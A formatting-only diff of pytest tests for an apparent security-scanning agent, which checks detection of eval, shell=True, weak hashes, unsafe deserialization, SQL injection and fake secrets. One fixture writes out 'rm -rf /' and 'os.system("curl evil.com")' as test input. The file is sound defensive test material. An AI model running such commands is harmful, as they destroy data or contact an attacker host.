@@ -171,7 +171,7 @@ class TestSQLInjection:
     @pytest.mark.asyncio
     async def test_sql_orm_safe(self, security_agent, temp_dir):
         """ORM queries should be safe (SQLAlchemy example)."""
-        code = 'session.query(User).filter(User.id == user_id).first()'
+        code = "session.query(User).filter(User.id == user_id).first()"
         file = temp_dir / "sql_orm.py"
         file.write_text(code)
 
@@ -274,7 +274,7 @@ class TestCommandInjection:
     @pytest.mark.asyncio
     async def test_eval_detection(self, security_agent, temp_dir):
         """Detect eval() usage."""
-        code = 'result = eval(user_input)'
+        code = "result = eval(user_input)"
         file = temp_dir / "eval1.py"
         file.write_text(code)
 
@@ -313,12 +313,12 @@ class TestCommandInjection:
     @pytest.mark.asyncio
     async def test_shell_true_multiline(self, security_agent, temp_dir):
         """Detect shell=True across multiple lines."""
-        code = '''
+        code = """
 result = subprocess.run(
     "ls -la",
     shell=True
 )
-'''
+"""
         file = temp_dir / "cmd6.py"
         file.write_text(code)
 
@@ -366,7 +366,7 @@ class TestPathTraversal:
     @pytest.mark.asyncio
     async def test_path_safe_resolve(self, security_agent, temp_dir):
         """Should NOT flag Path.resolve() (safe)."""
-        code = 'Path(base_dir).resolve() / filename'
+        code = "Path(base_dir).resolve() / filename"
         file = temp_dir / "path_safe.py"
         file.write_text(code)
 
@@ -406,7 +406,7 @@ class TestPathTraversal:
     @pytest.mark.asyncio
     async def test_path_join_safe(self, security_agent, temp_dir):
         """os.path.join() should be safer."""
-        code = 'os.path.join(base_dir, filename)'
+        code = "os.path.join(base_dir, filename)"
         file = temp_dir / "path4.py"
         file.write_text(code)
 
@@ -429,7 +429,7 @@ class TestWeakCrypto:
     @pytest.mark.asyncio
     async def test_md5_usage(self, security_agent, temp_dir):
         """Detect MD5 usage."""
-        code = 'import hashlib\nhashlib.md5(password.encode())'
+        code = "import hashlib\nhashlib.md5(password.encode())"
         file = temp_dir / "crypto1.py"
         file.write_text(code)
 
@@ -442,7 +442,7 @@ class TestWeakCrypto:
     @pytest.mark.asyncio
     async def test_sha1_usage(self, security_agent, temp_dir):
         """Detect SHA1 usage."""
-        code = 'import hashlib\nhashlib.sha1(data.encode())'
+        code = "import hashlib\nhashlib.sha1(data.encode())"
         file = temp_dir / "crypto2.py"
         file.write_text(code)
 
@@ -455,7 +455,7 @@ class TestWeakCrypto:
     @pytest.mark.asyncio
     async def test_sha256_safe(self, security_agent, temp_dir):
         """Should NOT flag SHA256 (safe)."""
-        code = 'import hashlib\nhashlib.sha256(data.encode())'
+        code = "import hashlib\nhashlib.sha256(data.encode())"
         file = temp_dir / "crypto_safe.py"
         file.write_text(code)
 
@@ -469,7 +469,7 @@ class TestWeakCrypto:
     @pytest.mark.asyncio
     async def test_sha3_safe(self, security_agent, temp_dir):
         """Should NOT flag SHA3 (safe)."""
-        code = 'import hashlib\nhashlib.sha3_256(data.encode())'
+        code = "import hashlib\nhashlib.sha3_256(data.encode())"
         file = temp_dir / "crypto3.py"
         file.write_text(code)
 
@@ -492,7 +492,7 @@ class TestUnsafeDeserialization:
     @pytest.mark.asyncio
     async def test_pickle_loads(self, security_agent, temp_dir):
         """Detect pickle.loads() usage."""
-        code = 'import pickle\ndata = pickle.loads(untrusted_data)'
+        code = "import pickle\ndata = pickle.loads(untrusted_data)"
         file = temp_dir / "deser1.py"
         file.write_text(code)
 
@@ -518,7 +518,7 @@ class TestUnsafeDeserialization:
     @pytest.mark.asyncio
     async def test_yaml_load_unsafe(self, security_agent, temp_dir):
         """Detect yaml.load() without SafeLoader."""
-        code = 'import yaml\ndata = yaml.load(untrusted_yaml)'
+        code = "import yaml\ndata = yaml.load(untrusted_yaml)"
         file = temp_dir / "deser3.py"
         file.write_text(code)
 
@@ -531,7 +531,7 @@ class TestUnsafeDeserialization:
     @pytest.mark.asyncio
     async def test_yaml_safe_load(self, security_agent, temp_dir):
         """Should NOT flag yaml.safe_load() (safe)."""
-        code = 'import yaml\ndata = yaml.safe_load(yaml_string)'
+        code = "import yaml\ndata = yaml.safe_load(yaml_string)"
         file = temp_dir / "deser_safe.py"
         file.write_text(code)
 
@@ -539,13 +539,15 @@ class TestUnsafeDeserialization:
         response = await security_agent.execute(task)
 
         vulns = response.data["vulnerabilities"]
-        deser_vulns = [v for v in vulns if v["type"] == VulnerabilityType.UNSAFE_DESERIALIZATION.value]
+        deser_vulns = [
+            v for v in vulns if v["type"] == VulnerabilityType.UNSAFE_DESERIALIZATION.value
+        ]
         assert len(deser_vulns) == 0
 
     @pytest.mark.asyncio
     async def test_yaml_load_with_safeloader(self, security_agent, temp_dir):
         """Should NOT flag yaml.load() with SafeLoader."""
-        code = 'import yaml\ndata = yaml.load(yaml_string, Loader=yaml.SafeLoader)'
+        code = "import yaml\ndata = yaml.load(yaml_string, Loader=yaml.SafeLoader)"
         file = temp_dir / "deser4.py"
         file.write_text(code)
 
@@ -553,13 +555,15 @@ class TestUnsafeDeserialization:
         response = await security_agent.execute(task)
 
         vulns = response.data["vulnerabilities"]
-        deser_vulns = [v for v in vulns if v["type"] == VulnerabilityType.UNSAFE_DESERIALIZATION.value]
+        deser_vulns = [
+            v for v in vulns if v["type"] == VulnerabilityType.UNSAFE_DESERIALIZATION.value
+        ]
         assert len(deser_vulns) == 0
 
     @pytest.mark.asyncio
     async def test_json_safe(self, security_agent, temp_dir):
         """json.load() should be safe."""
-        code = 'import json\ndata = json.load(f)'
+        code = "import json\ndata = json.load(f)"
         file = temp_dir / "deser5.py"
         file.write_text(code)
 
@@ -567,7 +571,9 @@ class TestUnsafeDeserialization:
         response = await security_agent.execute(task)
 
         vulns = response.data["vulnerabilities"]
-        deser_vulns = [v for v in vulns if v["type"] == VulnerabilityType.UNSAFE_DESERIALIZATION.value]
+        deser_vulns = [
+            v for v in vulns if v["type"] == VulnerabilityType.UNSAFE_DESERIALIZATION.value
+        ]
         assert len(deser_vulns) == 0
 
 
@@ -622,7 +628,7 @@ class TestSecretDetection:
     @pytest.mark.asyncio
     async def test_private_key_detection(self, security_agent, temp_dir):
         """Detect private key."""
-        code = '-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...'
+        code = "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA..."
         file = temp_dir / "secret4.py"
         file.write_text(code)
 
@@ -709,7 +715,7 @@ class TestOWASPScoring:
     @pytest.mark.asyncio
     async def test_score_with_critical_vuln(self, security_agent, temp_dir):
         """Critical vulnerability should heavily impact score."""
-        code = 'subprocess.run(user_input, shell=True)'
+        code = "subprocess.run(user_input, shell=True)"
         file = temp_dir / "bad.py"
         file.write_text(code)
 
@@ -733,13 +739,13 @@ class TestOWASPScoring:
     @pytest.mark.asyncio
     async def test_score_minimum_zero(self, security_agent, temp_dir):
         """Score should not go below 0."""
-        code = '''
+        code = """
 subprocess.run("rm -rf /", shell=True)
 os.system("curl evil.com")
 eval(user_input)
 API_KEY = "FAKE_TEST_KEY_NOT_REAL_STRIPE"
 AWS_KEY = "AKIAIOSFODNN7EXAMPLE"
-'''
+"""
         file = temp_dir / "nightmare.py"
         file.write_text(code)
 
@@ -751,11 +757,11 @@ AWS_KEY = "AKIAIOSFODNN7EXAMPLE"
     @pytest.mark.asyncio
     async def test_score_multiple_low_vulns(self, security_agent, temp_dir):
         """Multiple low-severity issues should accumulate."""
-        code = '''
+        code = """
 import hashlib
 hashlib.md5(data.encode())
 hashlib.sha1(data.encode())
-'''
+"""
         file = temp_dir / "low.py"
         file.write_text(code)
 
@@ -801,7 +807,7 @@ class TestEdgeCases:
     async def test_invalid_file_encoding(self, security_agent, temp_dir):
         """Handle files with encoding errors gracefully."""
         file = temp_dir / "bad_encoding.py"
-        file.write_bytes(b'\xff\xfe\xff\xfe')
+        file.write_bytes(b"\xff\xfe\xff\xfe")
 
         task = AgentTask(request="scan", context={"root_dir": str(temp_dir)})
         response = await security_agent.execute(task)
@@ -824,7 +830,7 @@ class TestEdgeCases:
         """Scan large codebase efficiently."""
         for i in range(50):
             file = temp_dir / f"module_{i}.py"
-            file.write_text(f'def func_{i}():\n    return {i}')
+            file.write_text(f"def func_{i}():\n    return {i}")
 
         task = AgentTask(request="scan", context={"root_dir": str(temp_dir)})
         response = await security_agent.execute(task)
@@ -874,11 +880,11 @@ class TestEdgeCases:
     @pytest.mark.asyncio
     async def test_severity_levels(self, security_agent, temp_dir):
         """Verify severity levels are correctly assigned."""
-        code = '''
+        code = """
 subprocess.run("ls", shell=True)  # CRITICAL
 os.system("echo hi")  # HIGH
 hashlib.md5(data.encode())  # MEDIUM
-'''
+"""
         file = temp_dir / "severity.py"
         file.write_text(code)
 
@@ -917,11 +923,11 @@ hashlib.md5(data.encode())  # MEDIUM
     @pytest.mark.asyncio
     async def test_multiple_vulnerabilities_same_file(self, security_agent, temp_dir):
         """Detect multiple vulnerabilities in same file."""
-        code = '''
+        code = """
 subprocess.run("ls", shell=True)
 os.system("echo hi")
 eval(user_input)
-'''
+"""
         file = temp_dir / "multi.py"
         file.write_text(code)
 
@@ -941,12 +947,14 @@ eval(user_input)
     async def test_agent_role_assignment(self, security_agent):
         """Verify agent has correct role."""
         from vertice_cli.agents.base import AgentRole
+
         assert security_agent.role == AgentRole.SECURITY
 
     @pytest.mark.asyncio
     async def test_agent_capabilities(self, security_agent):
         """Verify agent has correct capabilities."""
         from vertice_cli.agents.base import AgentCapability
+
         assert AgentCapability.READ_ONLY in security_agent.capabilities
         assert AgentCapability.BASH_EXEC in security_agent.capabilities
 
@@ -967,8 +975,10 @@ class TestIntegration:
         (temp_dir / "config").mkdir()
 
         (temp_dir / "src" / "app.py").write_text('print("app")')
-        (temp_dir / "src" / "db.py").write_text('cursor.execute("SELECT * FROM users WHERE id = %s" % user_id)')
-        (temp_dir / "tests" / "test_app.py").write_text('def test_app(): pass')
+        (temp_dir / "src" / "db.py").write_text(
+            'cursor.execute("SELECT * FROM users WHERE id = %s" % user_id)'
+        )
+        (temp_dir / "tests" / "test_app.py").write_text("def test_app(): pass")
         (temp_dir / "config" / ".env").write_text('API_KEY="FAKE_sk_live_TESTKEY1234567890abcdef"')
 
         task = AgentTask(request="scan", context={"root_dir": str(temp_dir)})
@@ -1003,7 +1013,7 @@ class TestIntegration:
     @pytest.mark.asyncio
     async def test_mixed_vulnerabilities(self, security_agent, temp_dir):
         """Scan file with multiple vulnerability types."""
-        code = '''
+        code = """
 import subprocess
 import hashlib
 
@@ -1012,7 +1022,7 @@ def bad_function(user_input, password):
     hashlib.md5(password.encode())
     eval("print('hi')")
     API_KEY = "FAKE_sk_live_TESTKEY1234567890abcdef"
-'''
+"""
         file = temp_dir / "mixed.py"
         file.write_text(code)
 
